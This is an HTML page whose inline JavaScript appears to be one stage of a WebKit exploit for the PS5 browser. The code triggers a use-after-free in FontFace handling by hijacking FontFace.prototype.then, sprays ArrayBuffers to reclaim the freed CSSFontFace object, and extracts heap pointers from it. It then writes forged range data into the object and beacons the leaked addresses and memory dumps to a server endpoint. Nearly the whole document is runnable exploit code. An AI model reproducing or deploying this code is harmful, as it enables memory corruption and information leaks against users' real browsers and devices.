<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P735 — FontFace Boolean Oracle Verification & Memory Layout Scout</title>
<script>
'use strict';
/* ============================================================
 * P735 — FontFace Boolean Oracle Verification & Memory Layout Scout
 *
 * Objectives:
 * 1. Clean Heap Isolation:
 *    - All heap perturbing operations (canvas, audits) are strictly moved to
 *      Step 3 (post-reclaim). Startup heap remains 100% pristine for leak & reclaim.
 * 2. Deterministic Pointer Extraction:
 *    - Directly bind P58 to v[11] (offset 0x58 = m_sources.m_buffer).
 *    - Directly bind P68 to v[13] (offset 0x68 = m_clients).
 *    - Eliminates false pointer extraction from early variant quadwords.
 * 3. Document.fonts.check() Pending Font Boolean Oracle:
 *    - Validate WebKit C++ specification on PS5:
 *        new FontFace('chkPend', 'url(/slow.woff)', {unicodeRange: 'U+0041-U+0043'})
 *        In-range char ('A' = 0x41)  -> Expect FALSE (font pending)
 *        Out-range char ('D' = 0x44) -> Expect TRUE  (font not needed)
 * 4. Full 24-Quadword Memory Audit (q0 .. q23):
 *    - Dumps all 192 bytes of the reclaimed CSSFontFace slot.
 *    - Pinpoints m_status (q18) and operational bitflags.
 * 5. Re-attaching FACE_B & Poisoned m_ranges Test:
 *    - Calls document.fonts.add(FACE_B).
 *    - Tests document.fonts.check('1em ' + FACE_B.family) with poisoned m_ranges.
 * ============================================================ */

function h16(v){ return ('0000000000000000'+BigInt(v||0).toString(16)).slice(-16); }

function b(tag,data){ try{var x=new XMLHttpRequest();
  x.open('GET','/beacon.php?tag=P735-'+encodeURIComponent(tag)+
    '&data='+encodeURIComponent(String(data||'').slice(0,700))+'&t='+Date.now(),false);
  x.send(null);}catch(e){} }

function log(s){
  var el = document.getElementById('out');
  if(el) el.textContent += s + '\n';
}

var P58 = null, P68 = null;
var FACE_B = null, BUF_B = null, VIEW_B = null;

function snap(){
  if(!VIEW_B) return [];
  var arr = [];
  for(var q=0; q<24; q++) arr.push(VIEW_B[q]);
  return arr;
}

function run(){
  b('BOOT','p735-oracle-scout');
  log('=== P735 FontFace Boolean Oracle Scout ===\n');

  /* Step 1: Baseline Leak with pristine heap */
  log('[Step 1] Baseline heap leak...');
  doLeak(function(){
    log('P58 = 0x' + h16(P58));
    log('P68 = 0x' + h16(P68) + '\n');

    /* Step 2: Deterministic Reclaim */
    log('[Step 2] Executing deterministic reclaim...');
    doReclaim(function(){
      /* Step 3: Run Diagnostics & Oracle Tests */
      log('\n[Step 3] Running diagnostics & oracle verification...');
      runDiagnostics();
    });
  });
}

/* ---- Step 1: Baseline Leak ---- */
function doLeak(cb){
  b('LEAK-GO','');
  var st = document.createElement('style');
  st.textContent = '@font-face{font-family:lk0;src:local(serif);unicode-range:U+0042;}';
  document.head.appendChild(st);

  var face = new FontFace('fl0','local(Times)',{unicodeRange:'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var abs = [], fired = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired) return undefined; fired=true;
      if(st){st.remove(); st.textContent=''; st=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<70;k++) abs.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk0');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl0, lk0','AB');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs.length;i++){
      var u=new Uint8Array(abs[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }

    if(best<0 || bestNz<4){
      b('LEAK-MISS','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    var v = new BigUint64Array(abs[best]);
    extractPointers(v);

    if(!P58){
      b('LEAK-NOPTR','nz='+bestNz);
      doLeakRetry(cb);
      return;
    }

    b('LEAK-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68)+'|nz='+bestNz);
    setTimeout(cb, 100);
  }, 350);
}

function doLeakRetry(cb){
  b('LEAK-RETRY','');
  var st2 = document.createElement('style');
  st2.textContent = '@font-face{font-family:lk1;src:local(serif);unicode-range:U+0043;}';
  document.head.appendChild(st2);

  var face2 = new FontFace('fl1','local(Times)',{unicodeRange:'U+0044'});
  document.fonts.add(face2);
  void face2.loaded;

  var abs2 = [], fired2 = false;
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
    get:function(){
      if(fired2) return undefined; fired2=true;
      if(st2){st2.remove(); st2.textContent=''; st2=null;}
      try{document.fonts.delete(this);}catch(e){}
      document.body.offsetHeight;
      for(var k=0;k<80;k++) abs2.push(new ArrayBuffer(192));
      try{document.fonts.check('1em lk1');}catch(e){}
      document.body.offsetHeight;
      return undefined;
    }, set:function(){}});

  document.fonts.load('1em fl1, lk1','CD');

  setTimeout(function(){
    delete FontFace.prototype.then;
    var best=-1, bestNz=0;
    for(var i=0;i<abs2.length;i++){
      var u=new Uint8Array(abs2[i]), nz=0;
      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
      if(nz>bestNz){bestNz=nz; best=i;}
    }
    if(best<0 || bestNz<4){ b('LEAK-RETRY-MISS','nz='+bestNz); return; }
    var v = new BigUint64Array(abs2[best]);
    extractPointers(v);
    if(!P58){ b('LEAK-RETRY-NOPTR','nz='+bestNz); return; }
    b('LEAK-RETRY-OK','p58=0x'+h16(P58)+'|p68=0x'+h16(P68));
    setTimeout(cb, 100);
  }, 400);
}

/* Deterministic Pointer Extraction: bind specifically to q11 (+0x58) and q13 (+0x68) */
function extractPointers(v){
  var LOW = BigInt('0x1000000000');
  var HIGH = BigInt('0x80000000000');

  /* Check canonical offsets first */
  if(v[11] >= LOW && v[11] < HIGH) P58 = v[11];
  if(v[13] >= LOW && v[13] < HIGH) P68 = v[13];

  /* Fallback scan only if canonical offsets are empty */
  if(!P58 || !P68){
    for(var q=0; q<24; q++){
      var val = v[q];
      if(val >= LOW && val < HIGH){
        if(!P58) P58 = val;
        else if(!P68 && val !== P58) P68 = val;
      }
    }
  }
  if(!P68) P68 = 0n;
}

/* ---- Step 2: Deterministic Reclaim ---- */
function doReclaim(cb){
  b('REC-START', 'fill_q12_q6=0x' + h16(P58));

  var stTr = document.createElement('style');
  stTr.textContent = '@font-face{font-family:trFam;src:local(Arial);unicode-range:U+0047;}';
  document.head.appendChild(stTr);

  FACE_B = new FontFace('trFace', 'local(Helvetica)', {unicodeRange:'U+0048'});
  document.fonts.add(FACE_B);
  void FACE_B.loaded;

  var absW = [], firedW = false;

  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function(){
      if(firedW) return undefined; firedW = true;
      if(stTr){ stTr.remove(); stTr.textContent = ''; }
      try{ document.fonts.delete(this); }catch(e){}
      document.body.offsetHeight;

      for(var k=0; k<80; k++){
        var ab = new ArrayBuffer(192);
        var view = new BigUint64Array(ab);
        view[12] = P58;
        view[6]  = P58;
        absW.push(ab);
      }

      try{ document.fonts.check('1em trFam'); }catch(e){}
      return undefined;
    }, set: function(){}
  });

  document.fonts.load('1em trFace, trFam', 'GH');

  setTimeout(function(){
    delete FontFace.prototype.then;

    var best = -1, bestNz = 0;
    for(var i=0; i<absW.length; i++){
      var u = new Uint8Array(absW[i]), nz = 0;
      for(var j=0; j<u.length; j++) if(u[j] !== 0) nz++;
      if(nz > bestNz){ bestNz = nz; best = i; }
    }

    if(best < 0 || bestNz < 4){
      b('RECLAIM-MISS', 'nz=' + bestNz);
      log('Reclaim missed!');
      return;
    }

    BUF_B = absW[best];
    VIEW_B = new BigUint64Array(BUF_B);

    b('RECLAIM-OK', 'baseK=' + best);
    log('Deterministic Reclaim OK at slot ' + best);

    setTimeout(cb, 100);
  }, 400);
}

/* ---- Step 3: Run Diagnostics & Oracle Tests ---- */
function runDiagnostics(){
  if(!VIEW_B) return;

  /* 3A: Full 24-Quadword Dump of the Reclaimed Buffer (Original State) */
  var d0_11 = [], d12_23 = [];
  for(var q=0; q<12; q++) d0_11.push('q' + q + '=0x' + h16(VIEW_B[q]));
  for(var q=12; q<24; q++) d12_23.push('q' + q + '=0x' + h16(VIEW_B[q]));
  b('DUMP-Q0-Q11', d0_11.join(';'));
  b('DUMP-Q12-Q23', d12_23.join(';'));

  /* 3B: Test Document.fonts.check() Pending-Font Boolean Oracle */
  try {
    /* Create a pending font face with range U+0041-U+0043 ('A' to 'C') */
    var testPending = new FontFace('chkPendFam', 'url(/slow_sim.woff)', {unicodeRange: 'U+0041-U+0043'});
    document.fonts.add(testPending);

    var pendStatus = testPending.status;
    var chkInA = document.fonts.check('1em chkPendFam', 'A'); /* 0x41: IN RANGE  -> Expect FALSE */
    var chkInB = document.fonts.check('1em chkPendFam', 'B'); /* 0x42: IN RANGE  -> Expect FALSE */
    var chkOutD = document.fonts.check('1em chkPendFam', 'D'); /* 0x44: OUT RANGE -> Expect TRUE */
    var chkOutZ = document.fonts.check('1em chkPendFam', 'Z'); /* 0x5A: OUT RANGE -> Expect TRUE */

    b('PENDING-ORACLE', 'status=' + pendStatus + '|inA=' + chkInA + '|inB=' + chkInB + '|outD=' + chkOutD + '|outZ=' + chkOutZ);
    log('Pending Oracle Test: inA=' + chkInA + ' inB=' + chkInB + ' outD=' + chkOutD + ' outZ=' + chkOutZ);
  } catch(e){
    b('PENDING-ORACLE-ERR', e.message);
  }

  /* 3C: Inspect Document.fonts Active Registry */
  var registeredFonts = [];
  try {
    document.fonts.forEach(function(ff){
      registeredFonts.push(ff.family + '(' + ff.status + ')');
    });
  } catch(e){}
  var hasFaceB = false;
  try { hasFaceB = document.fonts.has(FACE_B); } catch(e){}
  b('REG-AUDIT', 'count=' + registeredFonts.length + '|hasFaceB=' + hasFaceB + '|fonts=' + registeredFonts.join(','));

  /* 3D: Inspect FACE_B Properties */
  var fbStatus = 'err', fbFam = 'err', fbRange = 'err';
  try { fbStatus = FACE_B.status; } catch(e){ fbStatus = e.message; }
  try { fbFam = FACE_B.family; } catch(e){ fbFam = e.message; }
  try { fbRange = FACE_B.unicodeRange; } catch(e){ fbRange = e.message; }
  b('FACEB-PROPS', 'status=' + fbStatus + '|fam=' + fbFam + '|range=' + fbRange);

  /* 3E: Test Re-adding FACE_B to document.fonts */
  var readdResult = 'none';
  try {
    document.fonts.add(FACE_B);
    readdResult = 'ok|has=' + document.fonts.has(FACE_B);
  } catch(e){
    readdResult = 'err=' + e.message;
  }
  b('FACEB-READD', readdResult);

  /* 3F: Test fonts.check on FACE_B with poisoned m_ranges */
  /* Seed test range [0x41, 0x43] ('A' to 'C') at P58 */
  VIEW_B[0] = 0x0000004300000041n;
  VIEW_B[4] = P58;
  VIEW_B[5] = 0x0000000100000001n;

  var chFbA = 'err', chFbD = 'err';
  try { chFbA = document.fonts.check('1em trFace', 'A'); } catch(e){ chFbA = e.message; }
  try { chFbD = document.fonts.check('1em trFace', 'D'); } catch(e){ chFbD = e.message; }
  b('FACEB-CHECK-P58', 'chA=' + chFbA + '|chD=' + chFbD);

  /* 3G: Test fonts.check on trFam */
  var chTrA = 'err', chTrD = 'err';
  try { chTrA = document.fonts.check('1em trFam', 'A'); } catch(e){ chTrA = e.message; }
  try { chTrD = document.fonts.check('1em trFam', 'D'); } catch(e){ chTrD = e.message; }
  b('TRFAM-CHECK-P58', 'chA=' + chTrA + '|chD=' + chTrD);

  b('DONE', 'p735-complete');
  log('\n=== P735 Complete! ===');
}

if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script>
</head><body><pre id="out">P735 — FontFace Boolean Oracle Scout running...</pre></body></html>
